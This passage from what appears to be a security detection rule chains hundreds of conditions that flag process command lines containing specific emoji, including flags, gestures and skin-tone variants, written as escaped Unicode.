'\ud83c\uddea\ud83c\uddfa' || evt.Parsed.CommandLine contains '\ud83c\uddeb\ud83c\uddf0' || evt.Parsed.CommandLine contains '\ud83c\uddeb\ud83c\uddf4' || evt.Parsed.CommandLine contains '\ud83c\uddeb\ud83c\uddef' || evt.Parsed.CommandLine contains '\ud83c\uddeb\ud83c\uddee' || evt.Parsed.CommandLine contains '\ud83c\uddeb\ud83c\uddf7' || evt.Parsed.CommandLine contains '\ud83c\uddec\ud83c\uddeb' || evt.Parsed.CommandLine contains '\ud83c\uddf5\ud83c\uddeb' || evt.Parsed.CommandLine contains '\ud83c\uddf9\ud83c\uddeb' || evt.Parsed.CommandLine contains '\ud83c\uddec\ud83c\udde6' || evt.Parsed.CommandLine contains '\ud83c\uddec\ud83c\uddf2' || evt.Parsed.CommandLine contains '\ud83c\uddec\ud83c\uddea' || evt.Parsed.CommandLine contains '\ud83c\udde9\ud83c\uddea' || evt.Parsed.CommandLine contains '\ud83c\uddec\ud83c\udded' || evt.Parsed.CommandLine contains '\ud83c\uddec\ud83c\uddee' || evt.Parsed.CommandLine contains '\ud83c\uddec\ud83c\uddf7' || evt.Parsed.CommandLine contains '\ud83c\uddec\ud83c\uddf1' || evt.Parsed.CommandLine contains '\ud83c\uddec\ud83c\udde9' || evt.Parsed.CommandLine contains '\ud83c\uddec\ud83c\uddf5' || evt.Parsed.CommandLine contains '\ud83c\uddec\ud83c\uddfa' || evt.Parsed.CommandLine contains '\ud83c\uddec\ud83c\uddf9' || evt.Parsed.CommandLine contains '\ud83c\uddec\ud83c\uddec' || evt.Parsed.CommandLine contains '\ud83c\uddec\ud83c\uddf3' || evt.Parsed.CommandLine contains '\ud83c\uddec\ud83c\uddfc' || evt.Parsed.CommandLine contains '\ud83c\uddec\ud83c\uddfe' || evt.Parsed.CommandLine contains '\ud83c\udded\ud83c\uddf9' || evt.Parsed.CommandLine contains '\ud83c\udded\ud83c\uddf3' || evt.Parsed.CommandLine contains '\ud83c\udded\ud83c\uddf0' || evt.Parsed.CommandLine contains '\ud83c\udded\ud83c\uddfa' || evt.Parsed.CommandLine contains '\ud83c\uddee\ud83c\uddf8' || evt.Parsed.CommandLine contains '\ud83c\uddee\ud83c\uddf3' || evt.Parsed.CommandLine contains '\ud83c\uddee\ud83c\udde9' || evt.Parsed.CommandLine contains '\ud83c\uddee\ud83c\uddf7' || evt.Parsed.CommandLine contains '\ud83c\uddee\ud83c\uddf6' || evt.Parsed.CommandLine contains '\ud83c\uddee\ud83c\uddea' || evt.Parsed.CommandLine contains '\ud83c\uddee\ud83c\uddf2' || evt.Parsed.CommandLine contains '\ud83c\uddee\ud83c\uddf1' || evt.Parsed.CommandLine contains '\ud83c\uddee\ud83c\uddf9' || evt.Parsed.CommandLine contains '\ud83c\uddef\ud83c\uddf2' || evt.Parsed.CommandLine contains '\ud83c\uddef\ud83c\uddf5' || evt.Parsed.CommandLine contains '\ud83c\udf8c' || evt.Parsed.CommandLine contains '\ud83c\uddef\ud83c\uddea' || evt.Parsed.CommandLine contains '\ud83c\uddef\ud83c\uddf4' || evt.Parsed.CommandLine contains '\ud83c\uddf0\ud83c\uddff' || evt.Parsed.CommandLine contains '\ud83c\uddf0\ud83c\uddea' || evt.Parsed.CommandLine contains '\ud83c\uddf0\ud83c\uddee' || evt.Parsed.CommandLine contains '\ud83c\uddfd\ud83c\uddf0' || evt.Parsed.CommandLine contains '\ud83c\uddf0\ud83c\uddfc' || evt.Parsed.CommandLine contains '\ud83c\uddf0\ud83c\uddec' || evt.Parsed.CommandLine contains '\ud83c\uddf1\ud83c\udde6' || evt.Parsed.CommandLine contains '\ud83c\uddf1\ud83c\uddfb' || evt.Parsed.CommandLine contains '\ud83c\uddf1\ud83c\udde7' || evt.Parsed.CommandLine contains '\ud83c\uddf1\ud83c\uddf8' || evt.Parsed.CommandLine contains '\ud83c\uddf1\ud83c\uddf7' || evt.Parsed.CommandLine contains '\ud83c\uddf1\ud83c\uddfe' || evt.Parsed.CommandLine contains '\ud83c\uddf1\ud83c\uddee' || evt.Parsed.CommandLine contains '\ud83c\uddf1\ud83c\uddf9' || evt.Parsed.CommandLine contains '\ud83c\uddf1\ud83c\uddfa' || evt.Parsed.CommandLine contains '\ud83c\uddf2\ud83c\uddf4' || evt.Parsed.CommandLine contains '\ud83c\uddf2\ud83c\uddf0' || evt.Parsed.CommandLine contains '\ud83c\uddf2\ud83c\uddec' || evt.Parsed.CommandLine contains '\ud83c\uddf2\ud83c\uddfc' || evt.Parsed.CommandLine contains '\ud83c\uddf2\ud83c\uddfe' || evt.Parsed.CommandLine contains '\ud83c\uddf2\ud83c\uddfb' || evt.Parsed.CommandLine contains '\ud83c\uddf2\ud83c\uddf1' || evt.Parsed.CommandLine contains '\ud83c\uddf2\ud83c\uddf9' || evt.Parsed.CommandLine contains '\ud83c\uddf2\ud83c\udded' || evt.Parsed.CommandLine contains '\ud83c\uddf2\ud83c\uddf6' || evt.Parsed.CommandLine contains '\ud83c\uddf2\ud83c\uddf7' || evt.Parsed.CommandLine contains '\ud83c\uddf2\ud83c\uddfa' || evt.Parsed.CommandLine contains '\ud83c\uddfe\ud83c\uddf9' || evt.Parsed.CommandLine contains '\ud83c\uddf2\ud83c\uddfd' || evt.Parsed.CommandLine contains '\ud83c\uddeb\ud83c\uddf2' || evt.Parsed.CommandLine contains '\ud83c\uddf2\ud83c\udde9' || evt.Parsed.CommandLine contains '\ud83c\uddf2\ud83c\udde8' || evt.Parsed.CommandLine contains '\ud83c\uddf2\ud83c\uddf3' || evt.Parsed.CommandLine contains '\ud83c\uddf2\ud83c\uddea' || evt.Parsed.CommandLine contains '\ud83c\uddf2\ud83c\uddf8' || evt.Parsed.CommandLine contains '\ud83c\uddf2\ud83c\udde6' || evt.Parsed.CommandLine contains '\ud83c\uddf2\ud83c\uddff' || evt.Parsed.CommandLine contains '\ud83c\uddf2\ud83c\uddf2' || evt.Parsed.CommandLine contains '\ud83c\uddf3\ud83c\udde6' || evt.Parsed.CommandLine contains '\ud83c\uddf3\ud83c\uddf7' || evt.Parsed.CommandLine contains '\ud83c\uddf3\ud83c\uddf5' || evt.Parsed.CommandLine contains '\ud83c\uddf3\ud83c\uddf1' || evt.Parsed.CommandLine contains '\ud83c\uddf3\ud83c\udde8' || evt.Parsed.CommandLine contains '\ud83c\uddf3\ud83c\uddff' || evt.Parsed.CommandLine contains '\ud83c\uddf3\ud83c\uddee' || evt.Parsed.CommandLine contains '\ud83c\uddf3\ud83c\uddea' || evt.Parsed.CommandLine contains '\ud83c\uddf3\ud83c\uddec' || evt.Parsed.CommandLine contains '\ud83c\uddf3\ud83c\uddfa' || evt.Parsed.CommandLine contains '\ud83c\uddf3\ud83c\uddeb' || evt.Parsed.CommandLine contains '\ud83c\uddf0\ud83c\uddf5' || evt.Parsed.CommandLine contains '\ud83c\uddf2\ud83c\uddf5' || evt.Parsed.CommandLine contains '\ud83c\uddf3\ud83c\uddf4' || evt.Parsed.CommandLine contains '\ud83c\uddf4\ud83c\uddf2' || evt.Parsed.CommandLine contains '\ud83c\uddf5\ud83c\uddf0' || evt.Parsed.CommandLine contains '\ud83c\uddf5\ud83c\uddfc' || evt.Parsed.CommandLine contains '\ud83c\uddf5\ud83c\uddf8' || evt.Parsed.CommandLine contains '\ud83c\uddf5\ud83c\udde6' || evt.Parsed.CommandLine contains '\ud83c\uddf5\ud83c\uddec' || evt.Parsed.CommandLine contains '\ud83c\uddf5\ud83c\uddfe' || evt.Parsed.CommandLine contains '\ud83c\uddf5\ud83c\uddea' || evt.Parsed.CommandLine contains '\ud83c\uddf5\ud83c\udded' || evt.Parsed.CommandLine contains '\ud83c\uddf5\ud83c\uddf3' || evt.Parsed.CommandLine contains '\ud83c\uddf5\ud83c\uddf1' || evt.Parsed.CommandLine contains '\ud83c\uddf5\ud83c\uddf9' || evt.Parsed.CommandLine contains '\ud83c\uddf5\ud83c\uddf7' || evt.Parsed.CommandLine contains '\ud83c\uddf6\ud83c\udde6' || evt.Parsed.CommandLine contains '\ud83c\uddf7\ud83c\uddea' || evt.Parsed.CommandLine contains '\ud83c\uddf7\ud83c\uddf4' || evt.Parsed.CommandLine contains '\ud83c\uddf7\ud83c\uddfa' || evt.Parsed.CommandLine contains '\ud83c\uddf7\ud83c\uddfc' || evt.Parsed.CommandLine contains '\ud83c\uddfc\ud83c\uddf8' || evt.Parsed.CommandLine contains '\ud83c\uddf8\ud83c\uddf2' || evt.Parsed.CommandLine contains '\ud83c\uddf8\ud83c\udde6' || evt.Parsed.CommandLine contains '\ud83c\uddf8\ud83c\uddf3' || evt.Parsed.CommandLine contains '\ud83c\uddf7\ud83c\uddf8' || evt.Parsed.CommandLine contains '\ud83c\uddf8\ud83c\udde8' || evt.Parsed.CommandLine contains '\ud83c\uddf8\ud83c\uddf1' || evt.Parsed.CommandLine contains '\ud83c\uddf8\ud83c\uddec' || evt.Parsed.CommandLine contains '\ud83c\uddf8\ud83c\uddfd' || evt.Parsed.CommandLine contains '\ud83c\uddf8\ud83c\uddf0' || evt.Parsed.CommandLine contains '\ud83c\uddf8\ud83c\uddee' || evt.Parsed.CommandLine contains '\ud83c\uddec\ud83c\uddf8' || evt.Parsed.CommandLine contains '\ud83c\uddf8\ud83c\udde7' || evt.Parsed.CommandLine contains '\ud83c\uddf8\ud83c\uddf4' || evt.Parsed.CommandLine contains '\ud83c\uddff\ud83c\udde6' || evt.Parsed.CommandLine contains '\ud83c\uddf0\ud83c\uddf7' || evt.Parsed.CommandLine contains '\ud83c\uddf8\ud83c\uddf8' || evt.Parsed.CommandLine contains '\ud83c\uddea\ud83c\uddf8' || evt.Parsed.CommandLine contains '\ud83c\uddf1\ud83c\uddf0' || evt.Parsed.CommandLine contains '\ud83c\udde7\ud83c\uddf1' || evt.Parsed.CommandLine contains '\ud83c\uddf8\ud83c\udded' || evt.Parsed.CommandLine contains '\ud83c\uddf0\ud83c\uddf3' || evt.Parsed.CommandLine contains '\ud83c\uddf1\ud83c\udde8' || evt.Parsed.CommandLine contains '\ud83c\uddf5\ud83c\uddf2' || evt.Parsed.CommandLine contains '\ud83c\uddfb\ud83c\udde8' || evt.Parsed.CommandLine contains '\ud83c\uddf8\ud83c\udde9' || evt.Parsed.CommandLine contains '\ud83c\uddf8\ud83c\uddf7' || evt.Parsed.CommandLine contains '\ud83c\uddf8\ud83c\uddff' || evt.Parsed.CommandLine contains '\ud83c\uddf8\ud83c\uddea' || evt.Parsed.CommandLine contains '\ud83c\udde8\ud83c\udded' || evt.Parsed.CommandLine contains '\ud83c\uddf8\ud83c\uddfe' || evt.Parsed.CommandLine contains '\ud83c\uddf9\ud83c\uddfc' || evt.Parsed.CommandLine contains '\ud83c\uddf9\ud83c\uddef' || evt.Parsed.CommandLine contains '\ud83c\uddf9\ud83c\uddff' || evt.Parsed.CommandLine contains '\ud83c\uddf9\ud83c\udded' || evt.Parsed.CommandLine contains '\ud83c\uddf9\ud83c\uddf1' || evt.Parsed.CommandLine contains '\ud83c\uddf9\ud83c\uddec' || evt.Parsed.CommandLine contains '\ud83c\uddf9\ud83c\uddf0' || evt.Parsed.CommandLine contains '\ud83c\uddf9\ud83c\uddf4' || evt.Parsed.CommandLine contains '\ud83c\uddf9\ud83c\uddf9' || evt.Parsed.CommandLine contains '\ud83c\uddf9\ud83c\uddf3' || evt.Parsed.CommandLine contains '\ud83c\uddf9\ud83c\uddf7' || evt.Parsed.CommandLine contains '\ud83c\uddf9\ud83c\uddf2' || evt.Parsed.CommandLine contains '\ud83c\uddf9\ud83c\udde8' || evt.Parsed.CommandLine contains '\ud83c\uddf9\ud83c\uddfb' || evt.Parsed.CommandLine contains '\ud83c\uddfb\ud83c\uddee' || evt.Parsed.CommandLine contains '\ud83c\uddfa\ud83c\uddec' || evt.Parsed.CommandLine contains '\ud83c\uddfa\ud83c\udde6' || evt.Parsed.CommandLine contains '\ud83c\udde6\ud83c\uddea' || evt.Parsed.CommandLine contains '\ud83c\uddec\ud83c\udde7' || evt.Parsed.CommandLine contains '\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f' || evt.Parsed.CommandLine contains '\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc73\udb40\udc63\udb40\udc74\udb40\udc7f' || evt.Parsed.CommandLine contains '\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc77\udb40\udc6c\udb40\udc73\udb40\udc7f' || evt.Parsed.CommandLine contains '\ud83c\uddfa\ud83c\uddf3' || evt.Parsed.CommandLine contains '\ud83c\uddfa\ud83c\uddf8' || evt.Parsed.CommandLine contains '\ud83c\uddfa\ud83c\uddfe' || evt.Parsed.CommandLine contains '\ud83c\uddfa\ud83c\uddff' || evt.Parsed.CommandLine contains '\ud83c\uddfb\ud83c\uddfa' || evt.Parsed.CommandLine contains '\ud83c\uddfb\ud83c\udde6' || evt.Parsed.CommandLine contains '\ud83c\uddfb\ud83c\uddea' || evt.Parsed.CommandLine contains '\ud83c\uddfb\ud83c\uddf3' || evt.Parsed.CommandLine contains '\ud83c\uddfc\ud83c\uddeb' || evt.Parsed.CommandLine contains '\ud83c\uddea\ud83c\udded' || evt.Parsed.CommandLine contains '\ud83c\uddfe\ud83c\uddea' || evt.Parsed.CommandLine contains '\ud83c\uddff\ud83c\uddf2' || evt.Parsed.CommandLine contains '\ud83c\uddff\ud83c\uddfc\ud83e\udee0' || evt.Parsed.CommandLine contains '\ud83e\udee2' || evt.Parsed.CommandLine contains '\ud83e\udee3' || evt.Parsed.CommandLine contains '\ud83e\udee1' || evt.Parsed.CommandLine contains '\ud83e\udee5' || evt.Parsed.CommandLine contains '\ud83e\udee4' || evt.Parsed.CommandLine contains '\ud83e\udd79' || evt.Parsed.CommandLine contains '\ud83e\udef1' || evt.Parsed.CommandLine contains '\ud83e\udef1\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udef1\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udef1\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udef1\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udef1\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udef2' || evt.Parsed.CommandLine contains '\ud83e\udef2\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udef2\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udef2\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udef2\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udef2\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udef3' || evt.Parsed.CommandLine contains '\ud83e\udef3\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udef3\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udef3\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udef3\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udef3\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udef4' || evt.Parsed.CommandLine contains '\ud83e\udef4\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udef4\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udef4\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udef4\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udef4\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udef0' || evt.Parsed.CommandLine contains '\ud83e\udef0\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udef0\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udef0\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udef0\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udef0\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udef5' || evt.Parsed.CommandLine contains '\ud83e\udef5\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udef5\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udef5\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udef5\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udef5\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udef6' || evt.Parsed.CommandLine contains '\ud83e\udef6\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udef6\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udef6\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udef6\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udef6\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udd1d\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udd1d\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udd1d\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udd1d\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udd1d\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udef1\ud83c\udffb\u200d\ud83e\udef2\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udef1\ud83c\udffb\u200d\ud83e\udef2\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udef1\ud83c\udffb\u200d\ud83e\udef2\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udef1\ud83c\udffb\u200d\ud83e\udef2\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udef1\ud83c\udffc\u200d\ud83e\udef2\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udef1\ud83c\udffc\u200d\ud83e\udef2\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udef1\ud83c\udffc\u200d\ud83e\udef2\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udef1\ud83c\udffc\u200d\ud83e\udef2\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udef1\ud83c\udffd\u200d\ud83e\udef2\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udef1\ud83c\udffd\u200d\ud83e\udef2\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udef1\ud83c\udffd\u200d\ud83e\udef2\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udef1\ud83c\udffd\u200d\ud83e\udef2\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udef1\ud83c\udffe\u200d\ud83e\udef2\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udef1\ud83c\udffe\u200d\ud83e\udef2\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udef1\ud83c\udffe\u200d\ud83e\udef2\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udef1\ud83c\udffe\u200d\ud83e\udef2\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udef1\ud83c\udfff\u200d\ud83e\udef2\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udef1\ud83c\udfff\u200d\ud83e\udef2\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udef1\ud83c\udfff\u200d\ud83e\udef2\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udef1\ud83c\udfff\u200d\ud83e\udef2\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udee6' || evt.Parsed.CommandLine contains '\ud83e\udec5' || evt.Parsed.CommandLine contains '\ud83e\udec5\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udec5\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udec5\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udec5\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udec5\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udec3' || evt.Parsed.CommandLine contains '\ud83e\udec3\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udec3\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udec3\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udec3\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udec3\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udec4' || evt.Parsed.CommandLine contains '\ud83e\udec4\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udec4\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udec4\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udec4\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udec4\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\uddcc' || evt.Parsed.CommandLine contains '\ud83e\udeb8' || evt.Parsed.CommandLine contains '\ud83e\udeb7' || evt.Parsed.CommandLine contains '\ud83e\udeb9' || evt.Parsed.CommandLine contains '\ud83e\udeba' || evt.Parsed.CommandLine contains '\ud83e\uded8' || evt.Parsed.CommandLine contains '\ud83e\uded7' || evt.Parsed.CommandLine contains '\ud83e\uded9' || evt.Parsed.CommandLine contains '\ud83d\udedd' || evt.Parsed.CommandLine contains '\ud83d\udede' || evt.Parsed.CommandLine contains '\ud83d\udedf' || evt.Parsed.CommandLine contains '\ud83e\udeac' || evt.Parsed.CommandLine contains '\ud83e\udea9' || evt.Parsed.CommandLine contains '\ud83e\udeab' || evt.Parsed.CommandLine contains '\ud83e\ude7c' || evt.Parsed.CommandLine contains '\ud83e\ude7b' || evt.Parsed.CommandLine contains '\ud83e\udee7' || evt.Parsed.CommandLine contains '\ud83e\udeaa' || evt.Parsed.CommandLine contains '\ud83d\udff0' || evt.Parsed.CommandLine contains '\ud83d\ude2e\u200d\ud83d\udca8' || evt.Parsed.CommandLine contains '\ud83d\ude35\u200d\ud83d\udcab' || evt.Parsed.CommandLine contains '\ud83d\ude36\u200d\ud83c\udf2b\ufe0f' || evt.Parsed.CommandLine contains '\u2764\ufe0f\u200d\ud83d\udd25' || evt.Parsed.CommandLine contains '\u2764\ufe0f\u200d\ud83e\ude79' || evt.Parsed.CommandLine contains '\ud83e\uddd4\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd4\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd4\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd4\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd4\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd4\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd4\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd4\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd4\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd4\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd4\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd4\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc91\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc91\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc91\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc91\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc91\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc8f\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc8f\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc8f\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc8f\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc8f\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff' || evt.Parsed.CommandLine contains 